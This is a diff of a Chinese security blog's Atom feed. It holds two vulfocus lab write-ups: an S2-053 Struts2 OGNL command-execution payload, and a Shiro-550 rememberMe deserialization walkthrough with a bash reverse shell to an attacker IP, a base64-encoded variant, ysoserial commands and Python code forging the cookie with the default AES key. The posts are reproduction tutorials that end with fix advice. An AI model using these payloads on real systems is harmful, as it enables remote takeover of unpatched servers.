+    <category term="vulfocus靶场练习" scheme="https://hzktester.top/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    
+    
+    <category term="Struts2" scheme="https://hzktester.top/tags/Struts2/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>S2-053 CVE-2017-12611复现过程</title>
+    <link href="https://hzktester.top/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://hzktester.top/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <published>2020-08-14T07:31:00.000Z</published>
+    <updated>2020-09-21T12:03:39.062Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.1-2.3.33<br>Struts 2.5-2.5.10</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081412.png" alt="image"></li><li>利用POC</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;%&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#context.setMemberAccess(#dm)))).(#cmds&#x3D;(&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,&#39;id&#39;&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#process&#x3D;#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>burp抓包构造payload<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081413.png" alt="image"></li></ol>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。&lt;/p&gt;
+&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts 2.0.1-2.3.33&lt;br&gt;Struts 2.5-2.5.10&lt;/p&gt;</summary>
     
     
     
@@ -488,29 +536,6 @@
     
     
     <category term="Fastjson" scheme="https://hzktester.top/tags/Fastjson/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Shiro rememberMe反序列化漏洞复现过程（Shiro-550）</title>
-    <link href="https://hzktester.top/2020/08/06/Vulfocus%E9%9D%B6%E5%9C%BA/Shiro%20rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88Shiro-550%EF%BC%89/"/>
-    <id>https://hzktester.top/2020/08/06/Vulfocus%E9%9D%B6%E5%9C%BA/Shiro%20rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88Shiro-550%EF%BC%89/</id>
-    <published>2020-08-06T07:22:00.000Z</published>
-    <updated>2020-09-21T12:03:30.860Z</updated>
-    
-    <content type="html"><![CDATA[<p>Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。</p><p>那么，Payload产生的过程：</p><a id="more"></a><p>命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值</p><p>在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单</p><h2 id="影响版本：Apache-Shiro-lt-1-2-4"><a href="#影响版本：Apache-Shiro-lt-1-2-4" class="headerlink" title="影响版本：Apache Shiro &lt; 1.2.4"></a>影响版本：Apache Shiro &lt; 1.2.4</h2><h2 id="1-3-特征判断：返回包中包含rememberMe-deleteMe字段"><a href="#1-3-特征判断：返回包中包含rememberMe-deleteMe字段" class="headerlink" title="1.3 特征判断：返回包中包含rememberMe=deleteMe字段"></a>1.3 特征判断：返回包中包含rememberMe=deleteMe字段</h2><h2 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h2><table><thead><tr><th>角色</th><th>系统版本</th><th>IP</th><th>描述</th></tr></thead><tbody><tr><td>靶机</td><td>Centos7</td><td>192.168.3.130</td><td>Shiro rememberMe反序列化漏洞环境</td></tr><tr><td>攻击机</td><td>kali-linux-2020.3</td><td>192.168.3.131</td><td>工具：maven、ysoserial、Shiro_exploit</td></tr></tbody></table><h3 id="工具准备："><a href="#工具准备：" class="headerlink" title="工具准备："></a>工具准备：</h3><h4 id="maven配置"><a href="#maven配置" class="headerlink" title="maven配置"></a>maven配置</h4><p>kali安装<strong>maven</strong>，执行以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo wget  https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;apache&#x2F;maven&#x2F;maven-3&#x2F;3.6.3&#x2F;binaries&#x2F;apache-maven-3.6.3-bin.tar.gz</span><br><span class="line">tar -zxvf apache-maven-3.6.3-bin.tar.gz</span><br><span class="line">sudo mv apache-maven-3.6.3 &#x2F;usr&#x2F;local&#x2F;maven3</span><br></pre></td></tr></table></figure><p>添加maven环境变量（在/etc/profile末尾添加maven环境变量:）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;profile</span><br><span class="line">export M2_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;maven3</span><br><span class="line">export PATH&#x3D;$PATH:$JAVA_HOME&#x2F;bin:$M2_HOME&#x2F;bin</span><br><span class="line"></span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure><h4 id="下载ysoserial并打包"><a href="#下载ysoserial并打包" class="headerlink" title="下载ysoserial并打包"></a>下载ysoserial并打包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;frohoff&#x2F;ysoserial.git</span><br><span class="line">cd ysoserial</span><br><span class="line">mvn package -D skipTests</span><br></pre></td></tr></table></figure><h4 id="下载Shiro-exploit"><a href="#下载Shiro-exploit" class="headerlink" title="下载Shiro_exploit"></a>下载Shiro_exploit</h4><p>检查是否存在默认的key。安装Shiro_exploit</p><p>Github项目地址：<a href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a></p><h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><ol><li>攻击机使用Shiro_exploit爆破默认key（也就是AES加密的密钥）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py -u http:&#x2F;&#x2F;192.168.3.130:8080</span><br></pre></td></tr></table></figure>爆破出默认key如下：</li></ol><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080601.png" alt="image"></p><ol start="2"><li><p>攻击机制作反弹shell代码<br>监听本地端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure></li><li><p>Java Runtime 配合 bash 编码。<br>在线编码地址：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.3.131&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTMxLzIyMjIgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080602.png" alt="image"></p></li><li><p>通过ysoserial中JRMP监听模块，监听8888端口并执行反弹shell命令。</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTMxLzIyMjIgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080603.png" alt="image"></p><ol start="5"><li>使用shiro.py 生成Payload</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro.py 192.168.3.131:8888</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080604.png" alt="image"></p><p>shiro.py代码如下（注意key = base64.b64decode(“kPH+bIxk5D2deZiIxcaaaA==”)换为第一步爆破出的key）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-0.0.6-SNAPSHOT-all.jar&#39;, &#39;JRMPClient&#39;, command], stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    BS &#x3D; AES.block_size</span><br><span class="line">    pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key &#x3D; base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;)</span><br><span class="line">    iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">    encryptor &#x3D; AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body &#x3D; pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    payload &#x3D; encode_rememberme(sys.argv[1])   </span><br><span class="line">print &quot;rememberMe&#x3D;&#123;0&#125;&quot;.format(payload.decode())</span><br></pre></td></tr></table></figure><h2 id="1-7-构造数据包，伪造cookie，反弹shell"><a href="#1-7-构造数据包，伪造cookie，反弹shell" class="headerlink" title="1.7 构造数据包，伪造cookie，反弹shell"></a>1.7 构造数据包，伪造cookie，反弹shell</h2><ol><li>访问靶机环境（<a href="http://192.168.3.130:8080/%EF%BC%89%E5%B9%B6%E7%99%BB%E5%BD%95%EF%BC%8C%E7%99%BB%E5%BD%95%E5%8B%BE%E9%80%89remember">http://192.168.3.130:8080/）并登录，登录勾选remember</a> me<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080605.png" alt="image"></li><li>成功登录后访问任意url并抓包，查看到cookie中的remember me参数<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080606.png" alt="image"></li><li>获得的rememberMe置入cookies中<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080607.png" alt="image"></li><li>8888端口监听到流量信息</li></ol><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080608.png" alt="image"><br>5. 2222端口成功反弹shell</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080609.png" alt="image"></p><h2 id="1-8-修复建议"><a href="#1-8-修复建议" class="headerlink" title="1.8 修复建议"></a>1.8 修复建议</h2><ol><li>升级shiro到1.2.5及以上</li><li>如果在配置里配置了密钥，一定不要使用网上的密钥！！</li></ol><h2 id="1-9-遇到的问题"><a href="#1-9-遇到的问题" class="headerlink" title="1.9 遇到的问题"></a>1.9 遇到的问题</h2><ol><li>maven打包ysoserial时编译报错，需要在kali中安装jdk1.8的环境，配置环境变量（一定不要安装最新版的jdk，还会报错，不清楚原因）</li><li>使用Shiro_exploit时报错<strong>No module named Crypto.Cipher</strong>，执行以下命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo pip uninstall crypto</span><br><span class="line">sudo pip uninstall pycrypto</span><br><span class="line">sudo pip install pycrypto</span><br></pre></td></tr></table></figure></li><li>kali2020.2版本默认没有pip，需要安装</li></ol><p>python3安装pip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;get-pip.py | python3</span><br><span class="line">pip -V</span><br></pre></td></tr></table></figure><p>python2安装pip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;get-pip.py -o get-pip.py</span><br><span class="line">python2 get-pip.py</span><br></pre></td></tr></table></figure><p>检查安装情况<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080610.png" alt="image"></p>]]></content>
-    
-    
-    <summary type="html">&lt;p&gt;Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性。&lt;/p&gt;
-&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。&lt;/p&gt;
-&lt;p&gt;那么，Payload产生的过程：&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="vulfocus靶场练习" scheme="https://hzktester.top/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
-    
-    
-    <category term="Apache Shiro" scheme="https://hzktester.top/tags/Apache-Shiro/"/>
     
   </entry>
   
